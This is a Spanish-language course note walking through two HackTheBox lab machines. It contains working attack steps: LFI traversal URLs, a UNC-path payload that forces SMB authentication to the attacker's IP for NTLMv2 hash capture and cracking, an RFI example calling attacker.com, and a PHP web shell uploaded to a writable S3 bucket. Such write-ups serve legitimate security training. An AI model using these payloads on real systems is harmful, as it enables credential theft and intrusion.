---
tags:
- Máquinas y prácticas
---

# HTB Tier 1 Responder Three

**EVOLVE ACADEMY · MASTER EN CIBERSEGURIDAD**

**HackTheBox Tier 1 — Responder & Three**

Walkthrough completo de dos máquinas del Starting Point

*Temas: LFI · LLMNR Poisoning · Responder · NTLMv2 · John the Ripper · evil-winrm · WinRM · AWS S3 · Fuzzing de subdominios · Web Shell PHP*

# **① Contexto y preparación**

Este apunte cubre dos máquinas del Tier 1 de HackTheBox Starting Point: Responder y Three. Ambas se trabajan después de Appointment, Sequel y Crocodile, y son las que introducen los conceptos más importantes de toda esta primera fase: ataques LLMNR Poisoning en entornos Windows y mala configuración de buckets AWS S3.

Antes de empezar cualquier máquina, verificar:

| # 1. La VPN de Starting Point está conectada (no la de Machines)  ip a | grep tun0    # 2. La máquina víctima responde a ping  ping -c2 <IP\_VICTIMA>    # 3. Estructura de carpetas para la máquina  mkdir -p ~/Escritorio/<NombreMaquina>/{recon,exploits}  cd ~/Escritorio/<NombreMaquina> |
| --- |

| **VPN** | Error muy frecuente: estar conectado a la VPN de 'Machines' e intentar pingear una IP de 'Starting Point'. Resultado: 0% de paquetes. Cada laboratorio tiene su propia VPN — descargar la correcta desde el panel de HackTheBox. |
| --- | --- |

| **FLAG** | En todas las máquinas la flag está en el Desktop del usuario comprometido. Linux: /root/flag.txt o /home/<user>/flag.txt. Windows: C:\Users\<user>\Desktop\flag.txt |
| --- | --- |

# **② Máquina Responder — LFI + LLMNR Poisoning**

Responder es conceptualmente la máquina más importante del Tier 1. Combina dos vulnerabilidades: un Local File Inclusion (LFI) en una web PHP, y la posibilidad de capturar hashes NTLMv2 del usuario Administrator mediante un ataque de envenenamiento LLMNR/NBT-NS. El flujo completo es:

| **Nmap** | **→** | **LFI** | **→** | **Responder** | **→** | **Hash NTLMv2** | **→** | **John** | **→** | **evil-winrm** |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |

**Paso 1 — Reconocimiento con Nmap**

Lo primero, escaneo de servicios para entender la superficie de la máquina:

| nmap -sCV <IP> -oN recon/initial.txt    # Puertos relevantes encontrados:  # 80 → HTTP (Apache con redirección a unika.htb)  # 5985 → WinRM (Windows Remote Management) |
| --- |

La pista del puerto 5985 (WinRM) ya nos dice que en algún momento el ataque terminará con una conexión via evil-winrm. El objetivo intermedio será conseguir credenciales válidas.

**Paso 2 — Resolver el dominio unika.htb**

Al entrar a http://<IP> en el navegador, el servidor responde con una redirección a http://unika.htb. Como nuestro Kali no sabe resolver ese nombre, hay que añadirlo manualmente a /etc/hosts:

| echo '<IP> unika.htb' | sudo tee -a /etc/hosts    # Verificar:  cat /etc/hosts | grep unika    # Ahora http://unika.htb carga en el navegador |
| --- |

| **DNS** | /etc/hosts es la primera fuente de resolución de nombres en Linux, antes de consultar DNS. Tiene prioridad absoluta. Por eso es la solución universal cuando una web responde a un dominio en lugar de a una IP. |
| --- | --- |

**Paso 3 — Detectar el LFI**

Navegando por la web aparece un selector de idioma. Al cambiarlo, la URL pasa a ser algo como:

| http://unika.htb/index.php?page=french.html    # El parámetro 'page' es sospechoso: probablemente incluye archivos del servidor  # Probar LFI clásico para Windows:    http://unika.htb/index.php?page=../../../../windows/system32/drivers/etc/hosts    # Si muestra el contenido del fichero hosts → LFI CONFIRMADO |
| --- |

| **LFI** | Local File Inclusion permite leer archivos arbitrarios del sistema a través de un parámetro que incluye ficheros sin sanitización. Es una vulnerabilidad de capa de aplicación (L7). Frecuente en PHP con include(), require() y similares. |
| --- | --- |

**Paso 4 — Lanzar Responder en la interfaz de la VPN**

Responder es la herramienta que escucha peticiones LLMNR/NBT-NS en la red y captura los hashes NTLMv2 cuando un cliente Windows intenta autenticarse contra nosotros:

| sudo responder -I tun0    # -I tun0 → interfaz de la VPN de HackTheBox  # Si tu interfaz se llama diferente, comprueba con 'ip a' |
| --- |

| **LLMNR** | Cuando Windows no puede resolver un nombre por DNS, recurre a LLMNR (Link-Local Multicast Name Resolution) o NBT-NS. Hace un broadcast preguntando '¿quién tiene este nombre?'. Responder responde 'soy yo' y captura el hash cuando la víctima intenta autenticarse. |
| --- | --- |

**Paso 5 — Forzar la autenticación con el LFI**

Aquí es donde se combinan los dos vectores. Usamos el LFI para forzar al servidor web a intentar conectarse a un recurso SMB en nuestra IP. Esa conexión SMB se autentica con el hash NTLMv2 del usuario que corre el proceso del servidor web (Administrator):

| # En el navegador, sustituye <IP\_TUN0> por tu IP de la VPN (10.10.x.x):    http://unika.htb/index.php?page=//<IP\_TUN0>/somefile    # El servidor PHP intenta incluir un archivo desde una ruta SMB  # → se conecta a NUESTRA IP por SMB  # → Responder captura el hash NTLMv2 |
| --- |

Verificar nuestra IP de tun0 antes de lanzar la petición:

| ip a | grep -A2 tun0 | grep inet  # Ejemplo de salida: inet 10.10.15.41/23 scope global tun0 |
| --- |

**Paso 6 — Capturar el hash**

En la terminal donde tenemos Responder, aparece algo como:

| [SMB] NTLMv2-SSP Client : <IP\_VICTIMA>  [SMB] NTLMv2-SSP Username : RESPONDER\Administrator  [SMB] NTLMv2-SSP Hash : Administrator::RESPONDER:76890fa27f16acfc:5A1FE134AEEF36314BD26A8A40B7ECB9:01010000...    # Guardar el hash COMPLETO (la línea entera desde Administrator hasta el final) en un fichero:  nano hash.txt  # Pegar el hash, guardar y salir |
| --- |

| **FORMATO** | Hay que copiar el hash COMPLETO en una sola línea. Si lo cortas, John no podrá crackearlo. El formato es: usuario::dominio:challenge:hash:datos\_adicionales |
| --- | --- |

**Paso 7 — Crackear el hash con John the Ripper**

| john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt    # Salida esperada:  # badminton (Administrator)    # Si lanzas el comando dos veces, John no muestra nada porque ya lo tiene en su BD interna.  # Para ver hashes ya rotos:  john --show hash.txt |
| --- |

**Paso 8 — Acceso por WinRM con evil-winrm**

Con la contraseña en claro, conectamos al servicio WinRM del puerto 5985:

| evil-winrm -i <IP> -u administrator -p 'badminton'    # Una vez dentro tenemos una shell PowerShell con privilegios de Administrator    # Buscar la flag (siempre está en el Desktop del usuario):  dir C:\Users\mike\Desktop\  type C:\Users\mike\Desktop\flag.txt    # Si no sabes en qué usuario está, búscala recursivamente:  Get-ChildItem -Path C:\ -Recurse -Filter flag.txt -ErrorAction SilentlyContinue |
| --- |

| **RESUMEN** | Responder: detectar LFI → lanzar Responder en tun0 → forzar conexión SMB via LFI → capturar hash NTLMv2 → crackear con John → conectar con evil-winrm → flag en Desktop. |
| --- | --- |

| **REAL** | Este ataque es muy común en auditorías internas reales. Muchos usuarios tienen accesos directos a carpetas de red que ya no existen. Cuando Windows intenta resolverlas, Responder captura el hash. No requiere exploits, solo estar en la misma red. |
| --- | --- |

# **③ Máquina Three — AWS S3 mal configurado**

Three es la última máquina del Tier 1. Introduce dos conceptos nuevos: fuzzing de subdominios (en lugar de directorios) y abuso de un bucket AWS S3 mal configurado. El servicio S3 está siendo emulado en la máquina víctima (probablemente con LocalStack o MinIO) y se usa como webroot del servidor Apache. Cualquier archivo que se suba al bucket aparece servido desde la web.

| **Nmap** | **→** | **vhost fuzzing** | **→** | **AWS S3 público** | **→** | **Subir shell.php** | **→** | **RCE www-data** | **→** | **Flag** |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |

**Paso 1 — Reconocimiento con Nmap**

| nmap -sCV <IP> -oN recon/initial.txt    # Puertos relevantes:  # 22 → SSH  # 80 → HTTP (Apache)    # La web responde al dominio thetoppers.htb |
| --- |

**Paso 2 — Añadir el dominio a /etc/hosts**

| echo '<IP> thetoppers.htb' | sudo tee -a /etc/hosts |
| --- |

**Paso 3 — Fuzzing de subdominios (vhost)**

Hasta ahora hacíamos fuzzing de directorios (/admin, /login...). En Three la novedad es que hay que buscar subdominios (algo.thetoppers.htb). Esto se hace con el modo vhost de gobuster o equivalente en ffuf:

| # Con gobuster:  gobuster vhost \  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \  -u http://thetoppers.htb \  --append-domain \  --exclude-length 306    # --append-domain → añade .thetoppers.htb a cada palabra del diccionario  # --exclude-length 306 → filtra las respuestas 400 genéricas (ruido)    # Equivalente con ffuf:  ffuf -u http://thetoppers.htb \  -H 'Host: FUZZ.thetoppers.htb' \  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \  -fs 306    # Resultado: s3.thetoppers.htb |
| --- |

| **VHOST** | El modo vhost no funciona por DNS — funciona enviando una cabecera HTTP 'Host: subdominio.dominio' a la misma IP. El servidor web mira esa cabecera y decide qué sitio servir. Por eso el fuzzing es de cabeceras Host, no de DNS reales. |
| --- | --- |

**Paso 4 — Añadir el subdominio a /etc/hosts**

El subdominio s3.thetoppers.htb también necesita resolverse desde nuestro Kali:

| echo '<IP> s3.thetoppers.htb' | sudo tee -a /etc/hosts    # Verificar que están las dos entradas:  cat /etc/hosts | grep thetoppers  # 10.129.X.X thetoppers.htb  # 10.129.X.X s3.thetoppers.htb |
| --- |

**Paso 5 — Identificar el servicio y configurar AWS CLI**

's3' es Amazon S3 (Simple Storage Service), el almacenamiento de objetos de AWS. En la máquina está emulado por LocalStack o MinIO. Para interactuar con él usamos la herramienta oficial de Amazon:

| # Instalar la CLI (si no está):  sudo apt install awscli -y    # Configurar con credenciales ficticias  # (el bucket es público pero la CLI requiere algo configurado):  aws configure  # AWS Access Key ID: test  # AWS Secret Access Key: test  # Default region name: us-east-1  # Default output format: json |
| --- |

**Paso 6 — Listar buckets y archivos**

| # Listar todos los buckets:  aws --endpoint-url http://s3.thetoppers.htb s3 ls    # Salida:  # 2026-XX-XX XX:XX:XX thetoppers.htb    # Ver contenido del bucket (coincide con el webroot de Apache):  aws --endpoint-url http://s3.thetoppers.htb s3 ls s3://thetoppers.htb    # --endpoint-url → redirige las peticiones al S3 emulado de la víctima,  # no al AWS real de Amazon |
| --- |

| **CONFIG** | La vulnerabilidad real aquí no es un exploit ni un CVE: es una configuración insegura. Bucket público con permisos de escritura sin autenticación, y usado directamente como webroot. En el mundo real esto pasa continuamente con empresas que mal configuran sus buckets AWS. |
| --- | --- |

**Paso 7 — Crear y subir una webshell PHP**

| # Crear la shell PHP:  echo '<?php system($\_GET["cmd"]); ?>' > shell.php    # Subirla al bucket:  aws --endpoint-url http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb    # Verificar que está subida:  aws --endpoint-url http://s3.thetoppers.htb s3 ls s3://thetoppers.htb |
| --- |

La shell PHP es minimalista pero efectiva. Descomposición:

| <?php system($\_GET["cmd"]); ?>    # <?php ... ?> → bloque de código PHP que ejecuta el servidor  # system() → ejecuta un comando del sistema operativo  # $\_GET["cmd"] → toma el comando del parámetro 'cmd' de la URL |
| --- |

**Paso 8 — Ejecutar comandos y leer la flag**

| # Verificar que funciona — qué usuario corre el servidor web:  http://thetoppers.htb/shell.php?cmd=whoami  # Salida: www-data    # Buscar la flag en todo el sistema:  http://thetoppers.htb/shell.php?cmd=find / -name flag.txt 2>/dev/null  # Salida: /var/www/flag.txt    # Leer la flag:  http://thetoppers.htb/shell.php?cmd=cat /var/www/flag.txt |
| --- |

| **WWW-DATA** | www-data es la cuenta de servicio que ejecuta Apache en Linux. Es un usuario muy limitado — sus permisos son sobre el servicio web. En auditorías reales, después de obtener RCE como www-data, el siguiente paso es escalar privilegios (sudo -l, GTFOBins, SUID, kernel exploits...). |
| --- | --- |

| **RESUMEN** | Three: vhost fuzzing → s3.thetoppers.htb → AWS CLI con --endpoint-url → bucket público con escritura → subir shell.php → RCE como www-data → flag en /var/www/flag.txt. |
| --- | --- |

# **④ Conceptos clave para recordar**

**LLMNR / NBT-NS Poisoning**

Cuando Windows no puede resolver un nombre por DNS, hace broadcast preguntando por LLMNR (puerto 5355 UDP) o NBT-NS (puerto 137 UDP). Cualquier máquina en la red puede responder afirmativamente. Si la víctima intenta autenticarse contra esa máquina por SMB, envía su hash NTLMv2.

| **Protocolo** | **Puerto** | **Función** |
| --- | --- | --- |
| LLMNR | 5355 UDP | Resolución multicast en red local |
| NBT-NS | 137 UDP | NetBIOS Name Service |
| mDNS | 5353 UDP | Bonjour / Avahi |
| SMB | 445 TCP | Compartición de ficheros + autenticación |

**LFI vs RFI**

| **Tipo** | **Descripción** | **Ejemplo** |
| --- | --- | --- |
| LFI | Local File Inclusion: incluye archivos del propio servidor | ?page=../../../etc/passwd |
| RFI | Remote File Inclusion: incluye archivos desde una URL externa | ?page=http://attacker.com/shell.php |

RFI es menos común porque la mayoría de configuraciones PHP tienen 'allow\_url\_include = Off' por defecto. LFI sigue siendo prevalente.

**Hashes Windows: tipos y herramientas**

| **Tipo** | **Origen** | **Crackeable** | **Modo Hashcat** |
| --- | --- | --- | --- |
| LM | Legacy (Windows XP) | Trivial, roto | 3000 |
| NTLM | Hash local Windows | Sí, rockyou | 1000 |
| NTLMv1 | Net response (legacy) | Sí, vulnerable | 5500 |
| NTLMv2 | Net response (actual) | Sí, con diccionario | 5600 |
| Kerberos TGS | Active Directory | Kerberoasting | 13100 |

**Workflow HackTheBox Starting Point**

| **Nmap** | **→** | **/etc/hosts** | **→** | **Enumerar** | **→** | **Vulnerar** | **→** | **Flag** |
| --- | --- | --- | --- | --- | --- | --- | --- | --- |

Este workflow es aplicable a casi todas las máquinas del Starting Point. Las variaciones están en el paso 'Enumerar' (ffuf, gobuster, dirb...) y 'Vulnerar' (SQLi, LFI, RCE, credenciales por defecto...).

**Herramientas usadas en estas dos máquinas**

| **Herramienta** | **Función** |
| --- | --- |
| nmap | Reconocimiento de servicios y puertos |
| responder | Captura de hashes NTLMv2 por LLMNR/NBT-NS |
| john | Crackear hashes con diccionario |
| evil-winrm | Cliente WinRM para shell en Windows |
| gobuster vhost | Fuzzing de subdominios |
| ffuf | Alternativa moderna a gobuster |
| awscli | Interacción con S3 (oficial Amazon) |
| curl | Peticiones HTTP desde terminal |

| **SIGUIENTE** | Tras completar el Tier 1, el siguiente paso lógico es el Tier 2 de Starting Point (máquinas más complejas, varias etapas, escalada de privilegios) o pasar directamente a las máquinas Easy de la sección 'Machines' (con su VPN propia). |
| --- | --- |
